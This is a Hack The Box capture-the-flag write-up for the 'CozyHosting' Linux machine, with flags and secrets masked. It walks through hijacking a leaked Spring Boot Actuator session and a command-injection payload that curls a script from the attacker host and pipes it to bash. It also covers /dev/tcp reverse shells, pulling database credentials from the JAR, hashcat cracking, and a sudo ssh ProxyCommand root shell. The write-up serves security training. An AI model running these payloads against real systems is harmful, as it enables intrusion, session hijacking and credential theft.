# CozyHosting (HTB)

> Platform: Hack The Box  
> OS: Linux  
> Difficulty: Easy  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -p- --min-rate=5000 -T4 → 22 (SSH), 80 (nginx)
└── /etc/hosts: 10.129.229.88 cozyhosting.htb

Foothold (Spring Boot Actuator)
├── gobuster → /login, /admin (401), /logout, /error
├── ffuf (Java-Spring-Boot.txt) → /actuator, /actuator/sessions
├── /actuator/sessions → {"...":"kanderson"}
├── DevTools → JSESSIONID = kanderson → /admin
└── /actuator/mappings → POST /executessh

Command Injection (${IFS})
├── rev.sh: bash -i >& /dev/tcp/10.10.14.177/4444 0>&1
├── Payload: test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
└── shell as app

Credential Leak (JAR → PostgreSQL)
├── /app/cloudhosting-0.0.1.jar → BOOT-INF/classes/application.properties
│   └── postgres:<PASSWORD>
├── psql → SELECT * FROM users
│   └── admin:<BCRYPT_HASH>
└── hashcat -m 3200 → admin:<PASSWORD>

User Flag (Password Reuse)
├── ssh josh@10.129.229.88 → <PASSWORD>
└── cat user.txt → <USER_FLAG>

Privilege Escalation (sudo ssh ProxyCommand)
├── sudo -l → (root) /usr/bin/ssh *
├── sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/... 0>&1"' x
└── root → cat /root/root.txt (<ROOT_FLAG>)
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

A Spring Boot application with exposed Actuator, a JAR file with the DB password, an admin bcrypt hash, and `sudo ssh` for LPE.

---

## Reconnaissance

```bash
nmap -p- --min-rate=5000 -T4 -oG - cozyhosting.htb | grep open
nmap -sC -sV -p 22,80 cozyhosting.htb
```

| Port | Service | Version              |
|------|---------|----------------------|
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu |
| 80   | HTTP    | nginx 1.18.0         |

```bash
echo "10.129.229.88    cozyhosting.htb" | sudo tee -a /etc/hosts
```

---

## Foothold

No CVE (custom vulnerability) - Spring Boot Actuator `/actuator/sessions` returns session IDs without authentication; the leaked admin session grants access to the panel, where the hostname field is vulnerable to OS command injection.

```bash
gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

| Path     | Status |
|----------|--------|
| /login   | 200    |
| /admin   | 401    |
| /logout  | 204    |
| /error   | 500    |

Spring Boot pattern.

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
ffuf -w ~/Java-Spring-Boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
```

Found: `/actuator/sessions`, `/actuator/env`, `/actuator/health`, `/actuator/mappings`, `/actuator/beans`.

```bash
curl -s http://cozyhosting.htb/actuator/sessions
```

```json
{"<SESSION_ID>":"kanderson"}
```

Replace `JSESSIONID` → `/admin`.

```bash
curl -s http://cozyhosting.htb/actuator/mappings | jq
```

```
htb.cloudhosting.compliance.ComplianceService
executeOverSsh(String, String, HttpServletResponse)
POST /executessh
```

Space filter in username.

```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.177/4444 0>&1' > rev.sh
python3 -m http.server 7000
nc -lvnp 4444
```

Payload:

```
test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Shell as `app`.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Credential Leak

```bash
ls /app
# cloudhosting-0.0.1.jar
unzip -d /tmp/app /app/cloudhosting-0.0.1.jar
cat /tmp/app/BOOT-INF/classes/application.properties
```

```
spring.datasource.username=postgres
spring.datasource.password=<PASSWORD>
```

```bash
psql -h 127.0.0.1 -U postgres
# password: <PASSWORD>
\connect cozyhosting
SELECT * FROM users;
```

```
kanderson | <BCRYPT_HASH> | User
admin     | <BCRYPT_HASH> | Admin
```

```bash
echo '<BCRYPT_HASH>' > hash_file
hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
# <PASSWORD>
```

```bash
ssh josh@10.129.229.88
# password: <PASSWORD>
cat user.txt
# <USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Privilege Escalation

```bash
sudo -l
# User josh may run the following commands on localhost:
#     (root) /usr/bin/ssh *
```

```bash
nc -lvnp 5555
sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/10.10.14.177/5555 0>&1"' x
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

`ssh` executes `ProxyCommand` before the actual SSH connection - with root privileges.

```bash
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Flags

| Flag | Value                            |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Spring Boot Actuator** - `/actuator/sessions` returns session IDs without authentication.
- **Command Injection via `${IFS}`** - bypassing the space filter.
- **Unpacking JAR** - `application.properties` often contains DB credentials.
- **bcrypt hashes in PostgreSQL** - brute-force via hashcat mode 3200.
- **Password reuse** - the web panel admin password matched SSH.
- **`sudo ssh` + `ProxyCommand`** - a GTFOBins vector equivalent to a full root shell.
